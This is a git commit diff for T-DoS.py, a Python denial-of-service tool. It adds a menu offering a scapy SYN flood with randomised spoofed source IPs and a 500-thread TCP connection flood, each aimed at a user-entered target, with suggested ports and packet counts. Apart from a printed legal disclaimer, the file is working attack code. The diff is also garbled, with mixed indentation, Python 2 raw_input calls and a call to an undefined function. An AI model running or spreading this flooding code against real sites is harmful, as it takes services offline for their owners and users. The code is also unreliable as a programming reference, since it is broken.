1b7d9fcafff7164e99b3fa7fe9f7bf290148be58
Tommaso Bona <piergeolo@gmail.com>
2022-12-01 12:54:34 +0100

    Update T-DoS.py

--- T-DoS.py
+++ T-DoS.py
@@ -1,21 +1,15 @@
+from os import system
+from sys import stdout
+from scapy.all import *
+from random import randint
 import os
 from concurrent.futures import thread
 import socket
 import threading
-os.system("clear")
-os.system("toilet T-DoS")
-print("Coded By: ParzivalHack")
-print("Github: https://github.com/ParzivalHack")
-print("Disclaimer: Illecit use of this tool could lead to a violation of federal and local laws.")
-print("Use this tool only on your own website or websites from which you have obtained permission.")
-print("License: The source code of this tool is under the MIT License.")
-print("Website IP finder: www.site24x7.com/find-ip-address-of-web-site.html")
-target = str(input("Insert Target: "))
-port = int(input("Insert Port: "))
-Trd = int(input("Insert Threads: "))
+import time
 fake_ip = '44.197.175.168'
 attack_num = 0
-def attack():
+def Attack(target, port):
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
@@ -24,9 +18,92 @@ def attack():
 
         global attack_num
         attack_num += 1
-        print(attack_num)
+	print(attack_num)
 
         s.close()
-for i in range(Trd):
-    thread = threading.Thread(target = attack)
-    thread.start()
+    for i in range(500):
+        thread = threading.Thread(target = attack)
+        thread.start()
+
+def randomIP():
+	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
+	return ip
+
+
+def randInt():
+	x = randint(1000,9000)
+	return x
+
+
+def SYN_Flood(dstIP,dstPort,counter):
+	total = 0
+	print ("Sending packets...")
+
+	for x in range (0,counter):
+		s_port = randInt()
+		s_eq = randInt()
+		w_indow = randInt()
+
+		IP_Packet = IP()
+		IP_Packet.src = randomIP()
+		IP_Packet.dst = dstIP
+
+		TCP_Packet = TCP()
+		TCP_Packet.sport = s_port
+		TCP_Packet.dport = dstPort
+		TCP_Packet.flags = "S"
+		TCP_Packet.seq = s_eq
+		TCP_Packet.window = w_indow
+
+		send(IP_Packet/TCP_Packet, verbose=0)
+		total+=1
+
+	stdout.write("\nTotal packets sent: %i\n" % total)
+
+
+def main():
+    os.system("clear")
+    print("Disclaimer: Illecit use of this tool could lead to a violation of federal and local laws.")
+    print("Use this tool only on your own website or websites from which you have obtained permission.")
+    time.sleep(5)
+    os.system("clear")
+    print("  ______    ____       _____")
+    print(" /_  __/   / __ \____ / ___/")
+    print("  / /_____/ / / / __ \\__ \ ")
+    print(" / /_____/ /_/ / /_/ /__/ / ")
+    print("/_/     /_____/\____/____/  ")
+    print("Coded By: ParzivalHack")
+    print("Github: https://github.com/ParzivalHack")
+    print("      [Menu]      ")
+    print("1) SYN Flood (For small websites)")
+    print("2) HTTP Flood (For medium websites)")
+    option = int(input("Choose an option: "))
+    print(option)
+    if option == 1:
+        os.system("clear")
+	    print("Disclaimer: On Termux this attack doesn't work (unless you are Root)")
+	    print("because of sockets permissions.")
+	    time.sleep(5)
+	    print("  ______    ____       _____")
+        print(" /_  __/   / __ \____ / ___/")
+        print("  / /_____/ / / / __ \\__ \ ")
+        print(" / /_____/ /_/ / /_/ /__/ / ")
+        print("/_/     /_____/\____/____/  ")
+        dstIP = raw_input("Target IP: ")
+        dstPort = int(input("Target Port (443 suggested): "))
+        counter = int(input("Packets to send (5000 suggested): "))
+        SYN_Flood(dstIP,dstPort,int(counter))
+    elif option == 2:
+        os.system("clear")
+	    print("  ______    ____       _____")
+        print(" /_  __/   / __ \____ / ___/")
+        print("  / /_____/ / / / __ \\__ \ ")
+        print(" / /_____/ /_/ / /_/ /__/ / ")
+        print("/_/     /_____/\____/____/  ")
+        target = raw_input("Target IP: ")
+        port = int(input("Target Port (80 suggested): "))
+        Attack(target, port)
+
+
+if __name__ == "__main__":
+    main()
